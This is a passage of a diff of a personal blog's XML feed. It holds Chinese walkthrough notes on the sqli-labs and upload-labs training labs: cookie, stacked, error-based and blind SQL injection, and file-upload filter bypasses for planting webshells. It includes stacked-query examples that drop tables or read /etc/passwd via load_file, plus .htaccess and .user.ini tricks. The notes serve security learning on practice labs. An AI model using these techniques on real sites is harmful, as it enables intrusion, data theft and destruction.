-<h1 id="less20-cookie"><a href="#less20-cookie" class="headerlink" title="less20(cookie)"></a>less20(cookie)</h1><p>首先尝试直接在username和password注入，无果，我们可以首先使用合法的账户登录，再由标题可知我们可以从cookie下手，既然页面能显示我的cookie，那么他一定在后台获取了我的cookie，又显示了我的账户密码，我们便可以猜测是通过检验cookie中的uname的值来显示不同的账号密码，我们查看源码。</p>
-<p><img src="/../images/1736838783987.jpg" alt="1736838783987" loading="lazy"></p>
-<p>我们便能知道注入点就是那个SQL语句。我们只要修改cookie的值便能进行注入。例如</p>
-<p><img src="/../images/1736839137733.jpg" alt="1736839137733" loading="lazy"></p>
-<p>我们便可以得到想要的值。</p>
-<h1 id="less21-cookie"><a href="#less21-cookie" class="headerlink" title="less21(cookie)"></a>less21(cookie)</h1><p>同上，不过是括号加单引号闭合，且是base64编码。</p>
-<h1 id="less22-cookie"><a href="#less22-cookie" class="headerlink" title="less22(cookie)"></a>less22(cookie)</h1><p>同20，但是双引号</p>
-]]></content>
-      <tags>
-        <tag>sqlilab注入 web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>less50-53</title>
-    <url>/2025/02/19/less50-53/</url>
-    <content><![CDATA[<p><strong>Less 50 ~ 53 和 Less 46 ~ 49 的注入方法完全一样，但是这 4 个 Less 可以进行堆叠注入。</strong></p>
-<h1 id="less50"><a href="#less50" class="headerlink" title="less50"></a>less50</h1><p>数值型注入，和 Less 46 一样使用报错注入就可以完成</p>
-<h1 id="less51"><a href="#less51" class="headerlink" title="less51"></a>less51</h1><p>单引号闭合的字符型注入，和 Less 47 一样使用报错注入就可以完成。</p>
-<h1 id="less52"><a href="#less52" class="headerlink" title="less52"></a>less52</h1><p>数值型的盲注，和 Less 48 一样使用时间盲注就可以完成。</p>
-<h1 id="less53"><a href="#less53" class="headerlink" title="less53"></a>less53</h1><p>单引号闭合的字符型,和 Less 49 一样使用时间盲注就可以完成。</p>
 ]]></content>
       <tags>
         <tag>sqlilab注入 web</tag>
@@ -332,25 +332,119 @@
       </tags>
   </entry>
   <entry>
-    <title>less38-41</title>
-    <url>/2025/02/18/less38-41/</url>
-    <content><![CDATA[<p><strong>Less 38 ~ 41 虽然使用 Less 1 的方式注入即可注入成功，但是这 4 关存在堆叠注入漏洞。我们可以使用 “;” 闭合第一个 SQL 语句，然后在后面执行任意的 SQL 语句，通过这个漏洞我们可以对数据库执行任意的操作。</strong></p>
-<h1 id="less38"><a href="#less38" class="headerlink" title="less38"></a>less38</h1><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>此处使用 Less 1 的 payload 就可以完成注入，此处用于测试堆叠注入。所谓<strong>堆叠注入</strong>就是在原语句后加上分号，从而闭合前面的内容作为第一条 SQL 语句。然后在后面输入第二条的数据库操作语句，在条件允许可以被后端带入数据库执行。堆叠注入使用的范围非常有限，例如后端可能会限制 SQL 只执行一条语句。一旦这种漏洞存在，对数据库的破坏性是毁灭性的，因为这表示攻击者可以肆意对数据库进行操作。</p>
-<p>堆叠注入攻击<br>堆叠查询注入攻击可以执行多条语句，多语句之间以分号隔开。堆叠查询注入就是利用这个特点，在第二个SQL语句中构造自己的要执行的语句<br>新建一个表<code>select * from users;create table A like users;</code><br>删除创建的A表<code>select * from users;drop table test;</code><br>查询数据<code>select * from users;select B,C,D;</code><br>加载文件<code>select * from users;select load_file(&#39;/etc/passwd&#39;);</code><br>增加一条数据<code>select * from users;insert into users values(18,&#39;zhong&#39;,&#39;zhong&#39;);</code></p>
-<p>查看源码发现源码使用了 <strong>mysqli_multi_query()</strong> 函数，该函数可以执行多个 MySQL 语句。之前的 Less 使用的是 <strong>mysql_query() 函数</strong>，该函数只执行一条 MySQL 查询。</p>
-<h1 id="less39"><a href="#less39" class="headerlink" title="less39"></a>less39</h1><p>和less38一样，不过是数值型注入。</p>
-<h1 id="less40"><a href="#less40" class="headerlink" title="less40"></a>less40</h1><p>也是堆叠注入不过是单引号和括号型。</p>
-<h1 id="less41"><a href="#less41" class="headerlink" title="less41"></a>less41</h1><p>和39差不多也是堆叠注入的数值型。</p>
-]]></content>
-      <tags>
-        <tag>sqlilab注入 web</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>photos</title>
     <url>/2024/08/05/photos/</url>
     <content><![CDATA[<p>测试 测试<br><img src="/images/OIP-C.jpg" alt="OIP-C" loading="lazy"></p>
 ]]></content>
+  </entry>
+  <entry>
+    <title>upload1-10</title>
+    <url>/2025/02/19/upload1-10/</url>
+    <content><![CDATA[<h1 id="webshell-一句话木马"><a href="#webshell-一句话木马" class="headerlink" title="webshell&amp;一句话木马"></a>webshell&amp;一句话木马</h1><p>webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种代码执行环境，主要用于网站管理、服务器管理、权限管理等操作。使用方法简单，只需上传一个代码文件，通过网址访问，便可进行很多日常操作，极大地方便了使用者对网站和服务器的管理。</p>
+<p>而利用文件上传漏洞进行攻击时最常用的便是一句话木马，通过上传一句话木马文件配合菜刀、蚁剑等webshell连接工具等，获得目标服务器的读取权。</p>
+<p>这些博客详细记录了常用的一句话木马以及相关介绍</p>
+<p><a href="https://www.cnblogs.com/goodgad/p/13463866.html">常用的一句话木马</a></p>
+<p><a href="https://blog.csdn.net/weixin_39190897/article/details/86772765">Web安全-一句话木马</a></p>
+<h1 id="pass1-前端验证"><a href="#pass1-前端验证" class="headerlink" title="pass1(前端验证)"></a>pass1(前端验证)</h1><p>由于本题是在前端js进行过滤，我们可以直接使用开发者工具删去检查代码就行了。</p>
+<p>我们还可以使用bp抓包来上传：</p>
+<p>首先将我们的文件后缀名改为不会被过滤的，再使用bp抓包</p>
+<p><img src="/../images/b206a2afa85059b9c8d35cbbb6642117.png" alt="b206a2afa85059b9c8d35cbbb6642117" loading="lazy"></p>
+<p>我们的文件在这，我们这是把后缀名改为php即可，我们又知道上传的绝对路径，因此可以直接用蚁剑连接。</p>
+<h1 id="pass2-数据包修改MIME"><a href="#pass2-数据包修改MIME" class="headerlink" title="pass2(数据包修改MIME)"></a>pass2(数据包修改MIME)</h1><p>我们只需要用bp抓包，把请求体的MIME类型修改成png的MIME类型也就是说image&#x2F;png</p>
+<p><img src="/../images/1f5a8d5e3b200a81d39c173c304964bc.png" alt="1f5a8d5e3b200a81d39c173c304964bc" loading="lazy"></p>
+<p>便能上传成功。</p>
+<h1 id="pass3-过滤了-asp-aspx-php-jsp"><a href="#pass3-过滤了-asp-aspx-php-jsp" class="headerlink" title="pass3(过滤了.asp|.aspx|.php|.jsp)"></a>pass3(过滤了.asp|.aspx|.php|.jsp)</h1><p>除了这几种还有别的类型。</p>
+<ul>
+<li>ASP：asa&#x2F;cer&#x2F;cdx</li>
+<li>ASPX：ashx&#x2F;asmx&#x2F;ascx</li>
+<li>PHP：php4&#x2F;php5&#x2F;phtml&#x2F;php3&#x2F;pht</li>
+<li>JSP：jspx&#x2F;jspf</li>
+</ul>
+<p>我们只要上传别的就行。</p>
+<h1 id="pass4-htaccess"><a href="#pass4-htaccess" class="headerlink" title="pass4(.htaccess)"></a>pass4(.htaccess)</h1><p>本关把所有基本都给过滤了，我们只借助.htaccess来进行上传。</p>
+<p><code>.htaccess</code> 是一个配置文件，用于在Apache HTTP服务器中运行时对网站目录的访问权限和配置进行细粒度控制。它是一个分布式配置文件，意味着它可以在网站的主目录或任何子目录中存在，并对该目录及其所有子目录产生影响。</p>
+<p>其中，.htaccess文件中内容<code>SetHandler application/x-httpd-php</code>用来设置当前目录所有文件都使用PHP解析，无论上传任何文件，只要符合php语言代码规范，就会被当做php文件执行。</p>
+<p>使用前提</p>
+<ol>
+<li>要在apache下的<code>httpd.conf</code>文件更改。<br>启用<code>.htaccess</code>，需要修改httpd.conf，启用<code>AllowOverride All</code> ，并可以用AllowOverride限制特定命令的使用。<br>打开httpd.conf文件用文本编辑器打开后,查找</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;muma&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这些代码意味着会将名为muma的文件当成php脚本执行。</p>
+<p>我们先上传这个.htaccess文件再上传muma.png并用蚁剑连接就行了。</p>
+<h1 id="pass5-user-ini"><a href="#pass5-user-ini" class="headerlink" title="pass5(.user.ini)"></a>pass5(.user.ini)</h1><h2 id="查看源码："><a href="#查看源码：" class="headerlink" title="查看源码："></a>查看源码：</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>从通过HTTP POST上传的文件中获取文件名，并使用 <code>trim()</code> 函数去除文件名两端的空白字符。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$file_name = deldot($file_name);//删除文件名末尾的点</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>调用 <code>deldot()</code> 函数（这个函数在提供的代码片段中没有定义，但它应该是一个自定义函数，用于删除文件名末尾的点）。这通常是为了防止某些操作系统（如Windows）中隐藏文件名的点。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>使用 <code>strrchr()</code> 函数查找文件名中最后一个点的位置，并返回从点开始到字符串末尾的部分，即文件扩展名。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$file_ext = strtolower($file_ext); //转换为小写</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>将文件扩展名转换为小写，以确保与 <code>$deny_ext</code> 数组中的扩展名进行比较时大小写不敏感。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>使用 <code>str_ireplace()</code> 函数去除文件扩展名中的字符串 <code>::$DATA</code>。这可能是一种针对Windows系统的特定文件名攻击的防护措施。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$file_ext = trim($file_ext); //首尾去空</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>使用 <code>trim()</code> 函数去除文件扩展名两端的空白字符。</li>
+</ul>
+<p>我们可以用修改配置文件来上传，.user.ini实际上就是可以用户自定义的php.ini,不过只能自定义除了PHP_INI_SYSTEM之外的模式具体可以看官网（<a href="https://www.php.net/manual/zh/ini.list.php">PHP: php.ini 配置选项列表 - Manual</a>）</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>这里我们利用PHP_INI_PERDIR中的auto_prepend_file和auto_append_file,前者是在加载第一个PHP代码之前先预加载该配置所指示的php文件，后者则是之后。这样就能让所有php文件自动包含某个文件，前提是上传的目录下要有一个正常的php文件。</p>
+<p>我们首先上传一个.user.ini的文件，里面的设置为auto_prepend_file&#x3D;muma.png。这里的muma.png里即是我们的一句话木马。我们之后再把muma.png上传，便使得一句话木马能被成功利用。</p>
+<h1 id="pass6（大小写）"><a href="#pass6（大小写）" class="headerlink" title="pass6（大小写）"></a>pass6（大小写）</h1><p>本题没有对大小写进行检查，直接改为.PHp就能上传成功。</p>
+<p>要注意的是，上传的时候文件名给改了，我们可以在这查看改后的文件名</p>
+<p><img src="/../images/c2fo6hak5a22e_a3bf6c5be61f466ca27559897b985bc4.webp" alt="c2fo6hak5a22e_a3bf6c5be61f466ca27559897b985bc4" loading="lazy"></p>
+<p><img src="/../images/1740121002657(1).jpg" alt="1740121002657(1)" loading="lazy"></p>
+<p>之后便能用蚁剑进行连接。</p>
+<h1 id="pass7（空格绕过）"><a href="#pass7（空格绕过）" class="headerlink" title="pass7（空格绕过）"></a>pass7（空格绕过）</h1><p>由于源码中没有删除空格的代码，所以我们可以在后缀名的最后加上一个空格来绕过检查。（网上大都是这样的，不过我暂时没复现成功会上传出错，查资料说是php版本问题，要低于5.3.29，可是修改过后还是不行，之后再试试）</p>
+<h1 id="pass8（-绕过）"><a href="#pass8（-绕过）" class="headerlink" title="pass8（.绕过）"></a>pass8（.绕过）</h1><p>由于源码中没有删除.的代码，所以我们直接在文件名最后加上一个.来绕过检测这个也要注意php版本问题。</p>
+<h1 id="pass9-DATA绕过"><a href="#pass9-DATA绕过" class="headerlink" title="pass9(::$DATA绕过)"></a>pass9(::$DATA绕过)</h1><h2 id="额外数据流"><a href="#额外数据流" class="headerlink" title="额外数据流"></a>额外数据流</h2><p>一般情况下我们打开一个文件看到的是一个文件的默认数据流，但是windows支持在文件内部创建额外的数据流以保存其他信息，这些额外数据流可以通过在文件名后加上**::$DATA**来访问，例如查看1.txt的额外数据流我们可以访问1.txt::$DATA。</p>
+<p>但是windows的文件是不能出现：等特殊字符的，如果有系统会直接去掉，我们正好可以利用这个特性。</p>
+<p>我们首先在上传一个木马并且用bp抓包，在bp中在文件名后面加上**::$DATA**,上传到靶机（windows）后，::$DATA被删除，我们便能用蚁剑直接进行连接。</p>
+<h1 id="pass10-绕过"><a href="#pass10-绕过" class="headerlink" title="pass10(. .绕过)"></a>pass10(. .绕过)</h1><p>源码和第五关类似，由源码可知对文件名先删了个点再首尾去空，我们只要将文件名设置为.php. .,那么删完末尾还有个点，检测后缀名时会出错，与黑名单配对不上，故能绕过。</p>
+]]></content>
+      <tags>
+        <tag>upload-labs</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>博客的创建</title>
+    <url>/2024/08/04/%E5%8D%9A%E5%AE%A2%E7%9A%84%E5%88%9B%E5%BB%BA/</url>
+    <content><![CDATA[<p>搭建过程：<br>    先本地连接GitHub，再在GitHub里创建仓库，然后本地安装hexo，最后将hexo程序上传到GitHub。<br>遇到问题：<br>    1. 初始化hexo时弄错了文件夹<br>      解决：找到hexo程序所在文件夹使用git base初始化<br>    2：上传hexo时出现找不到github的邮箱和用户名的问题<br>      解决：网上寻找，在.deploy-git中的子文件.git找到config，并输入你的邮箱与用户名就可以解决<br>    &#x2F;&#x2F;之前出错的截图没了<br>    3：无法插入图片<br>      解决：b站（<a href="https://www.bilibili.com/video/BV1rM411c79A/?spm_id_from=333.337.search-card.all.click&vd_source=e0ae5bd7dc2c8b75c8ea1bcf435b83f1%EF%BC%89">https://www.bilibili.com/video/BV1rM411c79A/?spm_id_from=333.337.search-card.all.click&amp;vd_source=e0ae5bd7dc2c8b75c8ea1bcf435b83f1）</a><br>      在source中创建images文件并将你需要的图片放入然后就可以在md文件中引用图片</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>less46-49</title>
+    <url>/2025/02/19/less46-49/</url>
+    <content><![CDATA[<p><strong>Less 46 ~ 49 的网页功能是返回一个列表，因此我们不能借助回显位置进行注入。此时可以根据是否返回报错信息，选择使用报错注入还是时间盲注。</strong></p>
+<h1 id="less46"><a href="#less46" class="headerlink" title="less46"></a>less46</h1><p>改变参数 sort 的值，发现返回的列表是根据该表的第 sort 列排序进行回显。</p>
+<p>把所有类型测试完发现是数值型注入。</p>
+<p>由于此处数据返回的形式是表格，因此我们不能直接利用数据回显的位置。此处可以使用 <strong>updatexml() 函数</strong>进行报错注入，把敏感信息输出在错误信息中</p>
+<h1 id="less47"><a href="#less47" class="headerlink" title="less47"></a>less47</h1><p>和less46差不多，不过是单引号闭合</p>
+<h1 id="less48"><a href="#less48" class="headerlink" title="less48"></a>less48</h1><p>数值型，但没有错误信息回显，我们可以用时间盲注。</p>
+<h1 id="less49"><a href="#less49" class="headerlink" title="less49"></a>less49</h1><p>和less48差不多，不过是单引号闭合。</p>
+]]></content>
+      <tags>
+        <tag>sqlilab注入 web</tag>
+      </tags>
   </entry>
   <entry>
     <title>upload11-21</title>
@@ -451,91 +545,26 @@
       </tags>
   </entry>
   <entry>
-    <title>upload1-10</title>
-    <url>/2025/02/19/upload1-10/</url>
-    <content><![CDATA[<h1 id="webshell-一句话木马"><a href="#webshell-一句话木马" class="headerlink" title="webshell&amp;一句话木马"></a>webshell&amp;一句话木马</h1><p>webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种代码执行环境，主要用于网站管理、服务器管理、权限管理等操作。使用方法简单，只需上传一个代码文件，通过网址访问，便可进行很多日常操作，极大地方便了使用者对网站和服务器的管理。</p>
-<p>而利用文件上传漏洞进行攻击时最常用的便是一句话木马，通过上传一句话木马文件配合菜刀、蚁剑等webshell连接工具等，获得目标服务器的读取权。</p>
-<p>这些博客详细记录了常用的一句话木马以及相关介绍</p>
-<p><a href="https://www.cnblogs.com/goodgad/p/13463866.html">常用的一句话木马</a></p>
-<p><a href="https://blog.csdn.net/weixin_39190897/article/details/86772765">Web安全-一句话木马</a></p>
-<h1 id="pass1-前端验证"><a href="#pass1-前端验证" class="headerlink" title="pass1(前端验证)"></a>pass1(前端验证)</h1><p>由于本题是在前端js进行过滤，我们可以直接使用开发者工具删去检查代码就行了。</p>
-<p>我们还可以使用bp抓包来上传：</p>
-<p>首先将我们的文件后缀名改为不会被过滤的，再使用bp抓包</p>
-<p><img src="/../images/b206a2afa85059b9c8d35cbbb6642117.png" alt="b206a2afa85059b9c8d35cbbb6642117" loading="lazy"></p>
-<p>我们的文件在这，我们这是把后缀名改为php即可，我们又知道上传的绝对路径，因此可以直接用蚁剑连接。</p>
-<h1 id="pass2-数据包修改MIME"><a href="#pass2-数据包修改MIME" class="headerlink" title="pass2(数据包修改MIME)"></a>pass2(数据包修改MIME)</h1><p>我们只需要用bp抓包，把请求体的MIME类型修改成png的MIME类型也就是说image&#x2F;png</p>
-<p><img src="/../images/1f5a8d5e3b200a81d39c173c304964bc.png" alt="1f5a8d5e3b200a81d39c173c304964bc" loading="lazy"></p>
-<p>便能上传成功。</p>
-<h1 id="pass3-过滤了-asp-aspx-php-jsp"><a href="#pass3-过滤了-asp-aspx-php-jsp" class="headerlink" title="pass3(过滤了.asp|.aspx|.php|.jsp)"></a>pass3(过滤了.asp|.aspx|.php|.jsp)</h1><p>除了这几种还有别的类型。</p>
-<ul>
-<li>ASP：asa&#x2F;cer&#x2F;cdx</li>
-<li>ASPX：ashx&#x2F;asmx&#x2F;ascx</li>
-<li>PHP：php4&#x2F;php5&#x2F;phtml&#x2F;php3&#x2F;pht</li>
-<li>JSP：jspx&#x2F;jspf</li>
-</ul>
-<p>我们只要上传别的就行。</p>
-<h1 id="pass4-htaccess"><a href="#pass4-htaccess" class="headerlink" title="pass4(.htaccess)"></a>pass4(.htaccess)</h1><p>本关把所有基本都给过滤了，我们只借助.htaccess来进行上传。</p>
-<p><code>.htaccess</code> 是一个配置文件，用于在Apache HTTP服务器中运行时对网站目录的访问权限和配置进行细粒度控制。它是一个分布式配置文件，意味着它可以在网站的主目录或任何子目录中存在，并对该目录及其所有子目录产生影响。</p>
-<p>其中，.htaccess文件中内容<code>SetHandler application/x-httpd-php</code>用来设置当前目录所有文件都使用PHP解析，无论上传任何文件，只要符合php语言代码规范，就会被当做php文件执行。</p>
-<p>使用前提</p>
-<ol>
-<li>要在apache下的<code>httpd.conf</code>文件更改。<br>启用<code>.htaccess</code>，需要修改httpd.conf，启用<code>AllowOverride All</code> ，并可以用AllowOverride限制特定命令的使用。<br>打开httpd.conf文件用文本编辑器打开后,查找</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;muma&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
-
-<p>这些代码意味着会将名为muma的文件当成php脚本执行。</p>
-<p>我们先上传这个.htaccess文件再上传muma.png并用蚁剑连接就行了。</p>
-<h1 id="pass5-user-ini"><a href="#pass5-user-ini" class="headerlink" title="pass5(.user.ini)"></a>pass5(.user.ini)</h1><h2 id="查看源码："><a href="#查看源码：" class="headerlink" title="查看源码："></a>查看源码：</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>从通过HTTP POST上传的文件中获取文件名，并使用 <code>trim()</code> 函数去除文件名两端的空白字符。</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$file_name = deldot($file_name);//删除文件名末尾的点</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>调用 <code>deldot()</code> 函数（这个函数在提供的代码片段中没有定义，但它应该是一个自定义函数，用于删除文件名末尾的点）。这通常是为了防止某些操作系统（如Windows）中隐藏文件名的点。</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>使用 <code>strrchr()</code> 函数查找文件名中最后一个点的位置，并返回从点开始到字符串末尾的部分，即文件扩展名。</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$file_ext = strtolower($file_ext); //转换为小写</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>将文件扩展名转换为小写，以确保与 <code>$deny_ext</code> 数组中的扩展名进行比较时大小写不敏感。</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>使用 <code>str_ireplace()</code> 函数去除文件扩展名中的字符串 <code>::$DATA</code>。这可能是一种针对Windows系统的特定文件名攻击的防护措施。</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$file_ext = trim($file_ext); //首尾去空</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>使用 <code>trim()</code> 函数去除文件扩展名两端的空白字符。</li>
-</ul>
